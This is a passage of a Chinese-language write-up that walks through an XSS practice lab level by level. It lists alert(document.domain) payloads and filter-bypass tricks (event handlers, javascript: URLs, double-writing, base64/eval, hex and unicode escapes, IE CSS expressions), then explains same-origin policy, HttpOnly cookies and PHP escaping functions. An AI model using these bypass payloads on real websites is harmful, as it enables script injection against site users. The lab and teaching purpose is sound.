<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133620268.png" alt="image-20200413133620268"></p>
<h5 id="3、闭合思路分析"><a href="#3、闭合思路分析" class="headerlink" title="3、闭合思路分析"></a>3、闭合思路分析</h5><p>我们可以发现，输入的XSS被当做字符串输出了，当做字符串输入就不会触发xss弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135406234.png" alt="image-20200413135406234"></p>
<p>我们要通过HTML实践来触发XSS<code>&quot;onmouseover=&quot;alert(document.domain)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135708936.png" alt="image-20200413135708936"></p>
<p>提交，成功执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135729704.png" alt="image-20200413135729704"></p>
<h5 id="4、Payload触发XSS漏洞-1"><a href="#4、Payload触发XSS漏洞-1" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>当然不止onmouseover这一种事件，在本关开头图片上的事件可以每个都尝试一下，这里在使用一次<code>onclick</code>来进行XSS</p>
<p>进行提交</p>
<p><code>&quot;onclick=&quot;alert(document.domain);</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141408260.png" alt="image-20200413141408260"></p>
<p>提交之后单击输入框，就可以弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141505272.png" alt="image-20200413141505272"></p>
<h4 id="空格分隔属性的XSS"><a href="#空格分隔属性的XSS" class="headerlink" title="空格分隔属性的XSS"></a>空格分隔属性的XSS</h4><h5 id="1、XSS探测"><a href="#1、XSS探测" class="headerlink" title="1、XSS探测"></a>1、XSS探测</h5><p>空格分隔属性探测</p>
<p>构造第一无二的字符串，F12找到</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413143908401.png" alt="image-20200413143908401"></p>
<p>当我们使用之前的方法闭合是没有用的，我们尝试一下使用空格分隔</p>
<p>当输入<code>111 2222</code>时，111在引号中，2222却在引号外出现，这样我们就可以直接使用XSS了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413144534630.png" alt="image-20200413144534630"></p>
<h5 id="2、触发XSS"><a href="#2、触发XSS" class="headerlink" title="2、触发XSS"></a>2、触发XSS</h5><p>这里不能使用script，尖括号被转义了，所以使用事件来进行XSS</p>
<p>使用onclick或者其他的都可以，这里使用的onclick，onmouseover也可以，其他事件可以挨个尝试</p>
<p>输入内容的时候，会自动在等于号后加双引号。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145621371.png" alt="image-20200413145621371"></p>
<p>这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145044448.png" alt="image-20200413145044448">这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<h4 id="javascript伪协议的XSS"><a href="#javascript伪协议的XSS" class="headerlink" title="javascript伪协议的XSS"></a>javascript伪协议的XSS</h4><h5 id="1、jacascript伪协议介绍"><a href="#1、jacascript伪协议介绍" class="headerlink" title="1、jacascript伪协议介绍"></a>1、jacascript伪协议介绍</h5><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，他由javascript的解析其运行，如果javascript：URL中<code>javascript:var now = new Date();&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;+ now;</code></p>
<p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。</p>
<p><code>javascript:alert(&quot;hello word!&quot;)</code></p>
<h5 id="2、XSS漏洞发现-1"><a href="#2、XSS漏洞发现-1" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>设置独一无二字符串提交，在响应中寻找。</p>
<p>这里输出了特殊字符串，说明可能存在XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413152406498.png" alt="image-20200413152406498"></p>
<h5 id="3、a链接标签属性href介绍"><a href="#3、a链接标签属性href介绍" class="headerlink" title="3、a链接标签属性href介绍"></a>3、a链接标签属性href介绍</h5><p> <code>&lt;a&gt;</code>标签定义超链接。</p>
<p><code>&lt;a&gt;</code>元素最用要的属性是<code>href</code>属性，它指定链接的目标。</p>
<h5 id="4、Payload触发XSS漏洞-2"><a href="#4、Payload触发XSS漏洞-2" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>Payload：javascript:alert(document.domain)</p>
<p>将Payload输入到输入框并提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153224582.png" alt="image-20200413153224582"></p>
<p>单击超链接，查看返回效果，成功弹出弹框，并返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153245648.png" alt="image-20200413153245648"></p>
<h5 id="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"><a href="#因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下" class="headerlink" title="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"></a>因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下</h5><h5 id="F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"><a href="#F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关" class="headerlink" title="F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"></a>F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193122104.png" alt="image-20200413193122104"></p>
<h4 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h4><h5 id="1、XSS漏洞发现"><a href="#1、XSS漏洞发现" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193535545.png" alt="image-20200413193535545"></p>
<p>可以开到代码可以使用<code>&quot;&gt;</code>来闭合双引号和<code>&lt;input&gt;</code></p>
<p>按照之前的办法使用<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>查看返会结果，可以看到吧domain给替换成了空</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193837927.png" alt="image-20200413193837927"></p>
<h5 id="2、绕过思考"><a href="#2、绕过思考" class="headerlink" title="2、绕过思考"></a>2、绕过思考</h5><p>寻找过滤内容，这里过滤的就是domain</p>
<p>绕过策略</p>
<ul>
<li>双写绕过</li>
<li>编码绕过</li>
</ul>
<h5 id="3、双写绕过"><a href="#3、双写绕过" class="headerlink" title="3、双写绕过"></a>3、双写绕过</h5><p>Payload：<code>&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</code></p>
<p>复制Payload进行提交，页面成功弹窗。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194654678.png" alt="image-20200413194654678"></p>
<p>返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194724423.png" alt="image-20200413194724423"></p>
<h5 id="4、编码绕过"><a href="#4、编码绕过" class="headerlink" title="4、编码绕过"></a>4、编码绕过</h5><p>eval函数是javascript当中经常用来执行字符串，这个字符串就会当做程序进行执行</p>
<p>atob函数是将加密的base64编码进行解码，转换成原来的字符</p>
<p>Payload：<code>&quot;&gt;&lt;script&gt;eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;));&lt;/script&gt;</code></p>
<p>这里进行加密的内容只有<code>alert(document.domain)</code></p>
<p>进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195311101.png" alt="image-20200413195311101"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195353237.png" alt="image-20200413195353237"></p>
<p>查看页面返回信息</p>
<p>页面成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195418479.png" alt="image-20200413195418479"></p>
<h4 id="绕过替换scrip和on事件的XSS"><a href="#绕过替换scrip和on事件的XSS" class="headerlink" title="绕过替换scrip和on事件的XSS"></a>绕过替换scrip和on事件的XSS</h4><h5 id="1、XSS漏洞发现-1"><a href="#1、XSS漏洞发现-1" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串，随便打</p>
<p>在响应中查找输入的内容，发现了输入的字符串，由此就可能有XSS漏洞，是否存在需要我们具体探测。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414084954106.png" alt="image-20200414084954106"></p>
<h5 id="2、饶过思考"><a href="#2、饶过思考" class="headerlink" title="2、饶过思考"></a>2、饶过思考</h5><p>1、寻找过滤内容</p>
<p>文本框输入的onclick已经被过滤了onxxx，所以没有触发xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414085844194.png" alt="image-20200414085844194"></p>
<p>on事件被过滤后，我们尝试一下使用闭合inptu，使用script</p>
<p>可以看到script变成了xscript这样就导致页面无法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414090353664.png" alt="image-20200414090353664"></p>
<h5 id="3、伪协议绕过"><a href="#3、伪协议绕过" class="headerlink" title="3、伪协议绕过"></a>3、伪协议绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;/a&gt;</code></p>
<p>发现javascript中的script变成了xscript，这样也没有办法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414093328336.png" alt="image-20200414093328336"></p>
<h5 id="4、空格绕过"><a href="#4、空格绕过" class="headerlink" title="4、空格绕过"></a>4、空格绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascr      ipt:alert(document.domain);&quot;&gt;xss&lt;/a&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095059130.png" alt="image-20200414095059130"></p>
<p>单击后面的xss超链接，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095153281.png" alt="image-20200414095153281"></p>
<p>返回了<strong>Congratulations!!</strong>，成功通关</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095306986.png" alt="image-20200414095306986"></p>
<h4 id="利用IE特性绕过XSS过滤"><a href="#利用IE特性绕过XSS过滤" class="headerlink" title="利用IE特性绕过XSS过滤"></a>利用IE特性绕过XSS过滤</h4><h5 id="1、XSS漏洞发现-2"><a href="#1、XSS漏洞发现-2" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414140342524.png" alt="image-20200414140342524"></p>
<h5 id="2、基本XSS利用"><a href="#2、基本XSS利用" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>HTML事件触发XSS</p>
<p>发现onclick在双引号当中，需要进行闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152038909.png" alt="image-20200414152038909"></p>
<p>发现输入的双引号并没有被闭合，而是双引号和去掉双引号后的空格被去掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152200102.png" alt="image-20200414152200102"></p>
<p>测试之后使用script也被过滤了</p>
<h5 id="3、IE特性"><a href="#3、IE特性" class="headerlink" title="3、IE特性"></a>3、IE特性</h5><p>IE中两个反引号``可以闭合一个左边双引号</p>
<h5 id="4、Palyoad触发XSS"><a href="#4、Palyoad触发XSS" class="headerlink" title="4、Palyoad触发XSS"></a>4、Palyoad触发XSS</h5><p>Payload=``onclick=alert(document.domain)</p>
<p>编辑一个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414162753350.png" alt="image-20200414162753350"></p>
<p>发现使用``成功将双引号闭合，执行了onclick</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163018581.png" alt="image-20200414163018581"></p>
<p>点击输入框，弹出弹框说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163213485.png" alt="image-20200414163213485"></p>
<p>成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163234488.png" alt="image-20200414163234488"></p>
<h4 id="利用CSS特性触发XSS过滤"><a href="#利用CSS特性触发XSS过滤" class="headerlink" title="利用CSS特性触发XSS过滤"></a>利用CSS特性触发XSS过滤</h4><p>CSS层叠样式表</p>
<h5 id="1、XSS漏洞发现-3"><a href="#1、XSS漏洞发现-3" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，在响应中查找</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165148387.png" alt="image-20200414165148387"></p>
<h5 id="2、基本XSS利用-1"><a href="#2、基本XSS利用-1" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>因为是在属性中出现的字符串所以可以用事件触发XSS</p>
<p>利用HTML时间触发XSS</p>
<p>并没有当成Payload输出，而是当成字符串输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165445847.png" alt="image-20200414165445847"></p>
<p>使用script发现也是当做字符串输出，我们看一发现引号颜色不一样，这样可以确定被进行了转义</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165702242.png" alt="image-20200414165702242"></p>
<h5 id="3、CSS特性讲解"><a href="#3、CSS特性讲解" class="headerlink" title="3、CSS特性讲解"></a>3、CSS特性讲解</h5><p>background是设置背景颜色</p>
<p>指定一个url表名要加载一张图片</p>
<p>在加载图路径当中输入javascript伪协议执行JS。目前只有IE浏览器支持，其他浏览器已经不支持了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background.url(&quot;javascript:alert(document.domain);&quot;);	设置背景颜色</span><br></pre></td></tr></table></figure>

<h5 id="4、Payload触发XSS"><a href="#4、Payload触发XSS" class="headerlink" title="4、Payload触发XSS"></a>4、Payload触发XSS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:#f00;background.url(&quot;javascript:alert(document.domain);&quot;);  设置背景颜色</span><br></pre></td></tr></table></figure>

<p>IE11.0之后就不会执行该xss了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210507320.png" alt="image-20200414210507320"></p>
<p>点击YES放行，成功弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210533918.png" alt="image-20200414210533918"></p>
<h4 id="IE中利用CSS触发XSS"><a href="#IE中利用CSS触发XSS" class="headerlink" title="IE中利用CSS触发XSS"></a>IE中利用CSS触发XSS</h4><h5 id="1、CSS介绍"><a href="#1、CSS介绍" class="headerlink" title="1、CSS介绍"></a>1、CSS介绍</h5><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p>
<h5 id="2、CSS中执行JS"><a href="#2、CSS中执行JS" class="headerlink" title="2、CSS中执行JS"></a>2、CSS中执行JS</h5><p>css expression(css表达式)又称Dynamic properties(动态属性)是早期微软DHTML的产物，以其可以在Css中定义表达式(公式)来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题，微软从IE8 beta2标准模式开始，取消对css expression的支持。</p>
<p>实际应用</p>
<p>　　早期很多开发人员利用css expression实现了许多效果，比如将元素相对鼠标指针进行定位，根据一个定时器来移动元素等等。当然这些效果能够使用js来实现。</p>
<p>　　虽然css表达式问题很多，但是我们依然能够在网上看到它们的影子，甚至在一些成熟的商业网站上。最常见的一个应用就是悬浮在页面上的某个模块(比如导航、返回顶部)。</p>
<h5 id="3、注释绕过关键字过滤"><a href="#3、注释绕过关键字过滤" class="headerlink" title="3、注释绕过关键字过滤"></a>3、注释绕过关键字过滤</h5><p>CSS中的注释符/**/</p>
<p>绕过对关键字expression的过滤。ex/**/pression</p>
<h5 id="4、触发XSS"><a href="#4、触发XSS" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>xss:                            随便的属性爱设置啥设置啥</p>
<p>expres/**/sion        进行注释绕过</p>
<p>window.x                  window获取全局窗口，x是没有定义这个x变量，这样会报错执行alert代码</p>
<p>Payload：xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1})</p>
<p>复制进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100911703.png" alt="image-20200415100911703"></p>
<p>返回弹框，点击确定，返回Congratulations！！<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100943454.png" alt="image-20200415100943454"></p>
<h4 id="16进制绕过过滤触发XSS"><a href="#16进制绕过过滤触发XSS" class="headerlink" title="16进制绕过过滤触发XSS"></a>16进制绕过过滤触发XSS</h4><h5 id="1、16进制介绍"><a href="#1、16进制介绍" class="headerlink" title="1、16进制介绍"></a>1、16进制介绍</h5><p>十六进制转换有16进制每一位上可以是从小到大为：0-9、A-F。16个大小不同的数，即16进1，其中A-F（字母不区分大小写）这六个字母来分别表示10-15</p>
<p>使用python将字符串转换为16进制类型</p>
<p><code>\\x</code>将它输出为JS可以识别的16进制的写法</p>
<p><code>print(&quot;\\x&quot;+binascii.b2a_hex(s)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415134518536.png" alt="image-20200415134518536"></p>
<h5 id="2、XSS挖掘"><a href="#2、XSS挖掘" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>自己构造一个字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135051423.png" alt="image-20200415135051423"></p>
<h5 id="3、双斜杠-16进制绕过"><a href="#3、双斜杠-16进制绕过" class="headerlink" title="3、双斜杠+16进制绕过"></a>3、双斜杠+16进制绕过</h5><p>使用引号闭合等都不能将其闭合，还是当成字符串输出，可以看到，双引号颜色就不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135306740.png" alt="image-20200415135306740"></p>
<p>将尖括号进行转义，输入，这里不能使用单斜杠也就是<code>\x3c</code>会被转义，要是用双斜杠<code>\\x3c</code>这样才能正常输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135813336.png" alt="image-20200415135813336"></p>
<h5 id="4、触发XSS-1"><a href="#4、触发XSS-1" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p>
<p>输入Payload，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140124310.png" alt="image-20200415140124310"></p>
<p>并且返回了Congratulations!! </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140140261.png" alt="image-20200415140140261"></p>
<h4 id="unicode绕过过滤触发XSS"><a href="#unicode绕过过滤触发XSS" class="headerlink" title="unicode绕过过滤触发XSS"></a>unicode绕过过滤触发XSS</h4><h5 id="1、unicode介绍"><a href="#1、unicode介绍" class="headerlink" title="1、unicode介绍"></a>1、unicode介绍</h5><p>Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</p>
<p>使用py将字符串转换为Unicode类型</p>
<p>加双斜杠，单斜杠会被转义\u00就是JS能识别的Unicode编码</p>
<p><code>print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&lt;&quot;)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175404676.png" alt="image-20200415175404676"></p>
<h5 id="2、XSS挖掘-1"><a href="#2、XSS挖掘-1" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>构造一个字符串</p>
<p>输入之后被没有将其转换为尖括号，这样就不能使用16进制绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175524635.png" alt="image-20200415175524635"></p>
<h5 id="3、双斜杠-unicode绕过"><a href="#3、双斜杠-unicode绕过" class="headerlink" title="3、双斜杠+unicode绕过"></a>3、双斜杠+unicode绕过</h5><p>成功转换为了尖括号</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175910063.png" alt="image-20200415175910063"></p>
<h5 id="4、触发XSS-2"><a href="#4、触发XSS-2" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code></p>
<p>复制Payload，输入提交成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415180212082.png" alt="image-20200415180212082"></p>
<h4 id="浏览器同源策略介绍"><a href="#浏览器同源策略介绍" class="headerlink" title="浏览器同源策略介绍"></a>浏览器同源策略介绍</h4><h5 id="1、源的含义"><a href="#1、源的含义" class="headerlink" title="1、源的含义"></a>1、源的含义</h5><p>源指源头，信息来源的位置。在计算机中源在RFC6454文档中规定，源是由协议，主机名，端口名组成。</p>
<p>范例：协议://主机名:端口号/</p>
<p>它们的协议不一样，所以不是同源</p>
<p>如：<a href="http://1.1.1.1:8080/" target="_blank" rel="noopener">http://1.1.1.1:8080/</a>    和    <a href="https://1.1.1.1:8080/" target="_blank" rel="noopener">https://1.1.1.1:8080/</a></p>
<h5 id="2、同源策略"><a href="#2、同源策略" class="headerlink" title="2、同源策略"></a>2、同源策略</h5><p>在计算机中，同源策略（Same origin policy，SOP）用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面。</p>
<p>例如：源A–&gt;源B，如果两个的源不相同是不能进行直接通信的</p>
<p>只有两个页面属于同一个源才能互相访问。不同的源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的JS脚本采用ajax读取b.com里面的文件数据是不会报错的 </p>
<p>例如：源A页面访问源B页面认证cookie，如果不加阻止读取cookie，会造成cookie欺骗绕过登录验证。</p>
<p>注意：同源一定要是协议、主机名、端口号完全一致</p>
<h5 id="3、IE源的特殊处理"><a href="#3、IE源的特殊处理" class="headerlink" title="3、IE源的特殊处理"></a>3、IE源的特殊处理</h5><p>1、位于可信域（Trust Zones）的互信的域名间，不受同源策略限制</p>
<p>2、IE在判断同源时不考虑端口。</p>
<p>可是通过document.domain读取或修改源。但是有限制，修改之后的源不能通过其他脚本再次修改。</p>
<h5 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h5><p>domain 属性可以解决因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如：</p>
<p>child.a.com和a.com，</p>
<p>child.a1.com和child2.a.com</p>
<p>xxx.child1.a.com和child1.a.com</p>
<p>两两不同源，但可以通过设置document.domain=’a.com’，浏览器就会认为他们都是用一个源。想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain=’a.com’。</p>
<h4 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h4><h5 id="1、cookie介绍"><a href="#1、cookie介绍" class="headerlink" title="1、cookie介绍"></a>1、cookie介绍</h5><p>指某些网站为了辨别用户身份，进行了session跟踪而存储在用户本地终端上的数据（通常经过加密）。</p>
<p>cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，他可以包含有关用户的信息。无论何时用户连接到服务器，web站点都可以访问cookie信息。</p>
<p>目前有些cookie是临时的，有些则是持续的。临时的cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间，该cookie就会被系统清除。 </p>
<h5 id="2、cookie作用"><a href="#2、cookie作用" class="headerlink" title="2、cookie作用"></a>2、cookie作用</h5><p>cookie是存储在客户端上的一段小数据，浏览器（及客户端）通过HTTP协议和服务器端进行cookie交互，通常用材存储一些不敏感信息。</p>
<p>有时候cookie用于身份认证，这时候cookie信息很敏感</p>
<p>演示dvwa，sql注入利用，sqlmap测试</p>
<p>直接测试的话会进行302跳转，这样就没办法获取</p>
<p> <img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101131762.png" alt="image-20200416101131762"></p>
<p>如果我们将登录后的cookie，加入的话，进行运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101232606.png" alt="image-20200416101232606"></p>
<p>成功返回数据库，这就是cookie身份验证时的作用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101257277.png" alt="image-20200416101257277"></p>
<h5 id="3、清除cookie"><a href="#3、清除cookie" class="headerlink" title="3、清除cookie"></a>3、清除cookie</h5><ul>
<li>通过浏览器工具清除cookie，打开Internet选项</li>
<li><img src="/2020/04/20/XSS/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200416101920286.png" alt="image-20200416101920286"></li>
<li>通过设置cookie的有效期来清除cookie；删除cookie可能会导致某些页面不能用。</li>
</ul>
<p>可以通过一些就是360，电脑管家等杀毒软件清除cookie</p>
<h5 id="4、cookie-httponly"><a href="#4、cookie-httponly" class="headerlink" title="4、cookie httponly"></a>4、cookie httponly</h5><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416105305914.png" alt="image-20200416105305914"></p>
<p>设置一个xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111001365.png" alt="image-20200416111001365"></p>
<p>设置为true不能返回cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416110923115.png" alt="image-20200416110923115"></p>
<p>设置为false，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111051812.png" alt="image-20200416111051812"></p>
<p>发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111119690.png" alt="image-20200416111119690"></p>
<h4 id="xss-filter过滤器介绍-防御"><a href="#xss-filter过滤器介绍-防御" class="headerlink" title="xss-filter过滤器介绍(防御)"></a>xss-filter过滤器介绍(防御)</h4><h5 id="1、htmlspecialchars-函数"><a href="#1、htmlspecialchars-函数" class="headerlink" title="1、htmlspecialchars()函数"></a>1、htmlspecialchars()函数</h5><p>htmlspecialchars()函数吧预定义的字符转换为HTML实体</p>
<p>预定义的字符是：</p>
<ul>
<li><code>&amp;</code>     (和号)         成为    <code>&amp;</code></li>
<li><code>&quot;</code>     (双引号)     成为    <code>&quot;</code></li>
<li><code>&#39;</code>     (单引号)     成为    <code>&#39;</code></li>
<li><code>&lt;</code>     (小于)         成为    <code>&lt;</code></li>
<li><code>&gt;</code>     (大于)         成为    <code>1</code></li>
</ul>
<p>htmlspecialchars(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a></p>
<p>编写一个简单的xss，使用htmlspecialchars()进行过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131647589.png" alt="image-20200416131647589"></p>
<p>在地址栏输入id值，返回了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131716069.png" alt="image-20200416131716069"></p>
<p>改进代码，将scrip代码当做字符串，也就是实体输出，不会当成代码输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132559662.png" alt="image-20200416132559662"></p>
<p>验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132700892.png" alt="image-20200416132700892"></p>
<h5 id="2、htmlentities-函数"><a href="#2、htmlentities-函数" class="headerlink" title="2、htmlentities()函数"></a>2、htmlentities()函数</h5><p>这个函数对于过滤用户输入的数据非常有用，他会将一些特殊字符转换为HTML实体。例如，用户输入&lt;时就会被该函数转换为HTML实体&lt;(&amp;lt)，输入&gt;就会被转换为实体&amp;gt</p>
<p>htmlentities(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlentities.asp</a></p>
<p>构造一个xss</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140523501.png" alt="image-20200416140523501"></p>
<p>在页面中输入，发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140656017.png" alt="image-20200416140656017"></p>
<p>进行过滤更改</p>
